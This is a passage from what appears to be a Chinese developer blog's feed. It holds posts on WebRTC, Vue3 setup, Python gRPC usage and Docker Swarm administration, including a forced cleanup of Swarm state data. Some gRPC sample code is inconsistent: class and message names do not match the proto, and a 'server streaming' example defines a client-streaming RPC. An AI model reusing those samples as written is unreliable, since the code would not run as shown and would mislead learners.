title="内容总结"></a>内容总结</h2><p>只要完成上面部分的内容，就足够搭建出<code>1v1</code>的视频通信程序，可见WebRTC的使用还是非常方便的。并且WebRTC也是<strong>低延迟</strong>的第一梯队。</p><p>通过上面的内容学习，可见WebRTC最大的优点，是可以进行端对端通信，这是什么概念呢，对网络不熟悉的朋友可能无法理解。我们平时看直播、听广播、刷抖音都是非端对端通信，而是在中间通过媒体服务器进行推流才能获取内容的，假如服务器瘫痪了，正在接收的音视频也会因此中断。端对端，即P2P则无需中间服务器，直接通信传输，音视频质量<strong>只与自身网络质量</strong>有关。</p><p>当前WebRTC架构中我们了解到了，WebRTC并非不需要服务器，媒体协商和网络协商都需要信令服务器完成，<code>STUN/TURN</code>服务器则是获取自身的外网通信地址，或者无法<code>P2P</code>时进行转发。</p><p>在本文中主要讲解了基于<code>STUN</code>的<code>1v1 WebRTC</code>通信的原理和实现。而实际应用中，大多数会出现多人通信的场景，比如会议室、游戏语音、你画我猜等。在多人通信中，主要有<code>Mesh、MCU、SFU</code>三种架构，并且各有优缺点，由于WebRTC本身主要是端对端通信的协议，多人通信架构相对传统架构来说，没有长处。</p><p>传统<code>RTMP、RTSP、HLS</code>等推流协议架构成熟，能够轻松应用<code>CDN</code>进行媒体分发，对服务器压力小，支持并发高，能轻松达到千万级同时访问，编码解码压力小，如果是这些传统应用场景，建议还是使用推流协议完成。反之，如果是<font>局域网会议、一对一电话通话、共享屏幕、远程控制、白板共享</font>等网络并发小、需要低延迟、自身宽度条件好的情况，使用WebRTC能够快速开发、并且效果更好。</p><p>关于<font><strong>多人通信的WebRTC结构</strong></font>，下篇文章再介绍了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebRTC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3优秀库</title>
      <link href="/posts/91.html"/>
      <url>/posts/91.html</url>
      
        <content type="html"><![CDATA[<ol><li>VueUse</li></ol><h2 id="vs-code插件"><a href="#vs-code插件" class="headerlink" title="vs code插件"></a>vs code插件</h2><ol><li>JSON2TS json生成ts代码</li></ol><h2 id="Css查阅资料"><a href="#Css查阅资料" class="headerlink" title="Css查阅资料"></a>Css查阅资料</h2><ol><li>[Css语法查询-英文]: <a href="https://cssreference.io/">https://cssreference.io/</a>    “cssreference.io”</li></ol>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue3+TS+vite+pinia</title>
      <link href="/posts/15671.html"/>
      <url>/posts/15671.html</url>
      
        <content type="html"><![CDATA[<h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><ol><li>volar</li><li>TS（volar）</li></ol><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ol><li>node.js 16 (17之后使用openssl v3导致证书检验严格，出现报错。可以通过参数设置使用传统验证方式)</li><li>nvm作为node.js环境管理</li></ol><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python使用ETCD3</title>
      <link href="/posts/19522.html"/>
      <url>/posts/19522.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python使用gRPC协议通信</title>
      <link href="/posts/51030.html"/>
      <url>/posts/51030.html</url>
      
        <content type="html"><![CDATA[<h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><code>gRPC</code>是谷歌开源的通信协议，支持多开发语言，可以实现跨语言调用，函数调用的形式非常直观，需要编写<code>Protobuf </code>文件，生成对应开发语言的模块文件。<code>Protobuf </code>数据序列化传输是二进制协议传输，相对<code>json、xml</code>等格式要更加轻量。是目前<font title="blue">微服务</font>最流行使用的协议。</p><p><a href="https://grpc.io/">gRPC官网</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install grpcio #安装grpc</span><br><span class="line">pip install grpcio-tools #安装grpc tools</span><br></pre></td></tr></table></figure><h2 id="gRPC模式"><a href="#gRPC模式" class="headerlink" title="gRPC模式"></a>gRPC模式</h2><p><code>gRPC</code>提供了四种服务模式：</p><ol><li><p>一元 <code>RPC</code>，其中客户端向服务端发送单个请求并获得 单响应返回，就像正常的函数调用一样。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rpc</span> SayHello(HelloRequest) <span class="keyword">returns</span> (HelloResponse)</span>;</span><br></pre></td></tr></table></figure></li><li><p>服务端流式 <code>RPC</code>，其中客户端向服务端发送请求，并获得一个流来读取一系列消息。客户端从返回的流中读取，直到没有更多消息为止。<code>gRPC</code> 保证在单个 <code>RPC</code> 调用中进行消息排序。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rpc</span> LotsOfReplies(HelloRequest) <span class="keyword">returns</span> (stream HelloResponse)</span>;</span><br></pre></td></tr></table></figure></li><li><p>客户端流式 <code>RPC</code>，其中客户端写入一系列消息并将其发送到服务端，同样使用提供的流。一旦客户端完成了消息的写入，它将等待服务端读取它们并返回其响应。同样，<code>gRPC</code> 保证单个 <code>RPC</code> 调用中的消息顺序。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rpc</span> LotsOfGreetings(stream HelloRequest) <span class="keyword">returns</span> (HelloResponse)</span>;</span><br></pre></td></tr></table></figure></li><li><p>双向流式 <code>RPC</code>，其中双方使用读写流发送一系列消息。这两个流是独立运行的，因此客户端和服务端可以按照他们喜欢的顺序读写: 例如，服务端可以在写响应之前等待接收所有客户端消息，或者它可以交替读消息然后写消息，或者其他读写组合。保留了每个流中消息的顺序</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">rpc</span> BidiHello(stream HelloRequest) <span class="keyword">returns</span> (stream HelloResponse)</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Protobuf文件格式"><a href="#Protobuf文件格式" class="headerlink" title="Protobuf文件格式"></a>Protobuf文件格式</h2><table><thead><tr><th>常见关键字</th><th>解释</th></tr></thead><tbody><tr><td>syntax</td><td>指定protobuf版本</td></tr><tr><td>package</td><td>包名，可以不填</td></tr><tr><td>import</td><td>导入一些插件，一般go用的比较多</td></tr><tr><td>message</td><td>定义传输的数据结构</td></tr><tr><td>service</td><td>定义服务</td></tr><tr><td>rpc</td><td>定义服务中的方法</td></tr><tr><td>stream</td><td>定义方法中数据的传输方式为流传输</td></tr></tbody></table><table><thead><tr><th>常见数据类型</th><th>解释</th></tr></thead><tbody><tr><td>string</td><td>默认值为空白字符， 字符串必须始终包含UTF-8编码或7位ASCII文本。</td></tr><tr><td>int32/int64</td><td>对应长短整型，默认值是0</td></tr><tr><td>bool</td><td>bool类型</td></tr><tr><td>float</td><td>浮点型</td></tr><tr><td>repeated</td><td>对应于python列表类型，但不完全一样，数据类型只能为一种，不能动态变换</td></tr><tr><td>map</td><td>对应于python字典类型，但不完全一样，数据类型只能为一种，不能动态变换</td></tr><tr><td>bytes</td><td>比特类型，默认值是空白字节，可能包含任何字节序列</td></tr></tbody></table><h2 id="一元模式"><a href="#一元模式" class="headerlink" title="一元模式"></a>一元模式</h2><h3 id="编写Protobuf文件"><a href="#编写Protobuf文件" class="headerlink" title="编写Protobuf文件"></a>编写Protobuf文件</h3><p>首先定义<code>Protobuf</code>文件，通常以<code>.proto</code>文件名结尾。如下<code>example.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;   <span class="comment">// protobuf版本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> example;   <span class="comment">// 此文件的标识符,不添加也可以,以防止协议消息类型之间的名称冲突</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义请求消息结构</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">request</span> &#123;</span><br><span class="line"><span class="type">int32</span> age = <span class="number">1</span>;</span><br><span class="line"><span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义响应消息结构，字段编号不能相同，无特别意义</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">response</span> &#123;</span><br><span class="line"><span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义服务，一元模式协议，类似普通的HTTP请求，客户端发起请求，服务端返回结果，即完成一次通信</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">UserInfo</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Info (request) <span class="keyword">returns</span> (response) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写完<code>Protobuf</code>文件，需要使用<code>grpc-tools</code>生成对应的<code>python</code>代码，生成的代码供客户端和服务端调用。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m grpc_tools.protoc -I./protos/ --python_out=. --pyi_out=. --grpc_python_out=. example.proto  </span><br><span class="line"></span><br><span class="line">python_out：指定xxx_pb2.py的输出路径，编译生成处理protobuf相关的代码路径。传入.，则生成到当前目录。</span><br><span class="line">grpc_python_out：指定xxx_pb2_grpc.py的输出路径，编译生成处理grpc相关的代码路径，传入.，则生成到当前目录。</span><br><span class="line">grpc_tools.protoc：工具包，由安装的grpc-tools提供。</span><br><span class="line">-I：指定Protobuf协议文件的查找目录。</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><code>gRPC</code>常用于异步编程中，这里介绍异步和同步版本的调用分别如何使用。缩进代码预留，这里去除掉了导入<code>Protobuf</code>文件生成的模块。</p><ol><li><p>异步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Greeter</span>(example_pb2_grpc.UserInfoServicer):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">Info</span>(<span class="params">self, request, context</span>):</span><br><span class="line">        <span class="keyword">return</span> example_pb2.Info(message=<span class="string">&#x27;Hello, %s!&#x27;</span> % request.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">port</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># port = &#x27;50051&#x27;</span></span><br><span class="line">    server = grpc.aio.server()</span><br><span class="line">    example_pb2_grpc.add_UserInfoServicer_to_server(UserInfo(), server)</span><br><span class="line">    listen_addr = <span class="string">&#x27;[::]:&#x27;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">    server.add_insecure_port(listen_addr)</span><br><span class="line">    logging.info(<span class="string">&quot;Starting server on %s&quot;</span>, listen_addr)</span><br><span class="line">    <span class="keyword">await</span> server.start()</span><br><span class="line">    <span class="keyword">await</span> server.wait_for_termination()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    asyncio.run(serve(<span class="number">50051</span>))</span><br></pre></td></tr></table></figure></li><li><p>同步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Greeter</span>(example_pb2_grpc.UserInfoServicer):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Info</span>(<span class="params">self, request, context</span>):</span><br><span class="line">        <span class="keyword">return</span> example_pb2.Info(message=<span class="string">&#x27;Hello, %s!&#x27;</span> % request.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve</span>():</span><br><span class="line">    port = <span class="string">&#x27;50051&#x27;</span></span><br><span class="line">    server = grpc.server(futures.ThreadPoolExecutor(max_workers=<span class="number">10</span>))</span><br><span class="line">    example_pb2_grpc.add_UserInfoServicer_to_server(UserInfo(), server)</span><br><span class="line">    server.add_insecure_port(<span class="string">&#x27;[::]:&#x27;</span> + port)</span><br><span class="line">    server.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Server started, listening on &quot;</span> + port)</span><br><span class="line">    server.wait_for_termination()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig()</span><br><span class="line">    serve()</span><br></pre></td></tr></table></figure></li></ol><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ol><li><p>异步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> grpc.aio.insecure_channel(<span class="string">&#x27;localhost:50051&#x27;</span>) <span class="keyword">as</span> channel:</span><br><span class="line">        stub = example_pb2_grpc.UserInfoStub(channel)</span><br><span class="line">        response: example_pb2.response = <span class="keyword">await</span> stub.Info(example_pb2.request(</span><br><span class="line">            age=<span class="number">18</span>,</span><br><span class="line">            name=<span class="string">&quot;daoji&quot;</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + response.message)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig()</span><br><span class="line">    asyncio.run(run())</span><br></pre></td></tr></table></figure></li><li><p>同步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="comment"># NOTE(gRPC Python Team): .close() is possible on a channel and should be</span></span><br><span class="line">    <span class="comment"># used in circumstances in which the with statement does not fit the needs</span></span><br><span class="line">    <span class="comment"># of the code.</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Will try to greet world ...&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> grpc.insecure_channel(<span class="string">&#x27;localhost:50051&#x27;</span>) <span class="keyword">as</span> channel:</span><br><span class="line">        stub = example_pb2_grpc.UserInfoStub(channel)</span><br><span class="line">        response = stub.Info(example_pb2.request(name=<span class="string">&#x27;you&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + response.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig()</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></li></ol><h2 id="服务端流式"><a href="#服务端流式" class="headerlink" title="服务端流式"></a>服务端流式</h2><h3 id="Protobuf文件"><a href="#Protobuf文件" class="headerlink" title="Protobuf文件"></a>Protobuf文件</h3><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">request</span> &#123;</span><br><span class="line"><span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">response</span> &#123;</span><br><span class="line"><span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义服务，下面定义的这种为最简单的rpc服务，客户端发起请求，服务端返回结果,stream关键字用来定义流式传输</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">StreamTest</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ClientStream (stream request) <span class="keyword">returns</span> (response) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StreamTest</span>(example_pb2_grpc.StreamTestServicer):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ClientStream</span>(<span class="params">self, request_iterator: AsyncIterable[example_pb2.request],</span></span><br><span class="line"><span class="params">                           context: grpc.aio.ServicerContext</span>) -&gt; example_pb2.response:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">for</span> i <span class="keyword">in</span> request_iterator:</span><br><span class="line">            <span class="built_in">print</span>(i.message)</span><br><span class="line">            <span class="keyword">if</span> i.message == <span class="string">&#x27;close&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> example_pb2.response(message=<span class="string">&#x27;close!😢&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> example_pb2.response(message=<span class="string">&#x27;ok!🐧&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">serve</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    port = <span class="string">&#x27;50051&#x27;</span></span><br><span class="line">    server = grpc.aio.server()</span><br><span class="line">    example_pb2_grpc.add_StreamTestServicer_to_server(StreamTest(), server)</span><br><span class="line">    listen_addr = <span class="string">&#x27;[::]:&#x27;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">    server.add_insecure_port(listen_addr)</span><br><span class="line">    logging.info(<span class="string">&quot;Starting server on %s&quot;</span>, listen_addr)</span><br><span class="line">    <span class="keyword">await</span> server.start()</span><br><span class="line">    <span class="keyword">await</span> server.wait_for_termination()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig()</span><br><span class="line">    asyncio.run(serve())</span><br></pre></td></tr></table></figure><h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">client_stram</span>(<span class="params">stub: example_pb2_grpc.StreamTestStub</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    route_iterator = [example_pb2.request(message=<span class="string">&#x27;close&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gRPC AsyncIO client-streaming RPC API accepts both synchronous iterables</span></span><br><span class="line">    <span class="comment"># and async iterables.</span></span><br><span class="line">    route_summary = <span class="keyword">await</span> stub.ClientStream(route_iterator)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> grpc.aio.insecure_channel(<span class="string">&#x27;localhost:50051&#x27;</span>) <span class="keyword">as</span> channel:</span><br><span class="line">        stub = example_pb2_grpc.StreamTestStub(channel)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-------------- RecordRoute --------------&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> client_stram(stub)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><h2 id="客户端流式"><a href="#客户端流式" class="headerlink" title="客户端流式"></a>客户端流式</h2><h2 id="双向流式"><a href="#双向流式" class="headerlink" title="双向流式"></a>双向流式</h2>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swarm集群系统搭建和管理技巧</title>
      <link href="/posts/31580.html"/>
      <url>/posts/31580.html</url>
      
        <content type="html"><![CDATA[<h1 id="Swarm集群系统搭建和管理技巧"><a href="#Swarm集群系统搭建和管理技巧" class="headerlink" title="Swarm集群系统搭建和管理技巧"></a>Swarm集群系统搭建和管理技巧</h1><h2 id="Portainer管理面板"><a href="#Portainer管理面板" class="headerlink" title="Portainer管理面板"></a>Portainer管理面板</h2><p>&emsp;&emsp;针对Portainer面板这里不过详细介绍，目前Docker单节点、Swarm集群的管理面板中，没有其他面板能够媲美它了。安装也是一键搞定，所有上手使用非常轻松。<a href="https://docs.portainer.io/start/intro">Introduction - Portainer Documentation</a>，如果不是服务器配置特别低，建议学习和自建使用可以安装上，可视化操作还是比较方便的。</p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/Snipaste_2022-11-24_20-40-26.webp" alt="portainer登录页面"></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/Snipaste_2022-11-24_20-43-21.webp" alt="集群节点选择页面"></p><p><img src="https://cdn.jsdelivr.net/gh/daojiAnime/cdn@master/img/Snipaste_2022-11-24_20-43-46.webp" alt="集群管理页面"></p><h2 id="Swarm常用命令"><a href="#Swarm常用命令" class="headerlink" title="Swarm常用命令"></a>Swarm常用命令</h2><h3 id="初始化Swarm集群"><a href="#初始化Swarm集群" class="headerlink" title="初始化Swarm集群"></a>初始化Swarm集群</h3><p>&emsp;&emsp;Swarm集群需要开放<code>2377``7946``4789</code>这三个端口进行集群通信，特殊的主机商如阿里云文档说明<code>4789</code>网络作为常规的UDP通信端口，不提供给用户使用。如果出现通信异常和跨主机网络异常，需要检查这些因素。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker swarm init --advertise-addr 公网IP</span><br></pre></td></tr></table></figure><h3 id="添加节点"><a href="#添加节点" class="headerlink" title="添加节点"></a>添加节点</h3><p>&emsp;&emsp;添加节点的时候，最好<font>附带上指定IP的参数</font><code>--listen-addr IP地址</code>，部分主机商多层网络比较复杂，自动获取的IP不是公网IP，而是内网的IP，导致端口即使是开放的也无法正常连接Overlay网络。</p><h4 id="添加manager节点"><a href="#添加manager节点" class="headerlink" title="添加manager节点"></a>添加manager节点</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker swarm join-token manager <span class="comment"># 获取添加命令</span></span><br></pre></td></tr></table></figure><h4 id="添加worker节点"><a href="#添加worker节点" class="headerlink" title="添加worker节点"></a>添加worker节点</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker swarm join-token worker <span class="comment"># 获取添加命令</span></span><br></pre></td></tr></table></figure><h3 id="解散集群和节点主动脱离"><a href="#解散集群和节点主动脱离" class="headerlink" title="解散集群和节点主动脱离"></a>解散集群和节点主动脱离</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker swarm leave -f</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如果需要离开集群，可以在对应节点执行上面的命令。</p><h2 id="集群运维技巧"><a href="#集群运维技巧" class="headerlink" title="集群运维技巧"></a>集群运维技巧</h2><h3 id="Overlay网络连接不上的问题"><a href="#Overlay网络连接不上的问题" class="headerlink" title="Overlay网络连接不上的问题"></a>Overlay网络连接不上的问题</h3><p>&emsp;&emsp;Overlay网络不通，主要是两个原因：</p><ol><li>端口未开放，无法正常通信。</li><li>加入节点时未指明节点IP，出现节点IP无数据交换。</li></ol><h3 id="节点无响应"><a href="#节点无响应" class="headerlink" title="节点无响应"></a>节点无响应</h3><p>Swarm集群稳定性不足，重启的节点脱离后，会在节点记录之前的节点信息，重新加入节点却被认为是一个新节点，之前的集群信息未清除，导致无响应，节点异常。执行下面指令清除Swarm集群信息后，再加入集群。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker swarm leave -f</span><br><span class="line">docker network <span class="built_in">rm</span> docker_gwbridge</span><br><span class="line">systemctl stop docker</span><br><span class="line"><span class="built_in">rm</span> -rf /var/lib/docker/swarm</span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>另外一种情况是管理节点异常，例如3个管理节点，出现一个管理节点掉线，两个管理节点无法选举Leader节点，如果节点比较多，建议<code>5节点</code>或<code>7节点</code>，根据Raft算法，管理节点最好是基数，并且建议最多<code>7节点。</code>此时可以使用<code>docker node demote 节点ID</code>让一台管理节点变成worker节点。然后再恢复3管理节点。</p><h3 id="内存不足的问题"><a href="#内存不足的问题" class="headerlink" title="内存不足的问题"></a>内存不足的问题</h3><p>由于集群的长期使用，动态更新，系统内残留无用的日志、镜像、容器、Cache会堆在内存中，一般当docker反馈这个信息的时候，已经是宿主机内存分配完了<code>df -hl</code>可以看到磁盘没剩多少空间了。<code>docker system df</code>可以查看docker使用的内存空间。<code>docker system prune -a</code>命令能够清空docker无用的文件，这个命令是最干净的。如果需要针对性的清除，可以清除镜像即可，例如<code>docker image prune -a</code>。</p><h3 id="Service约束的使用"><a 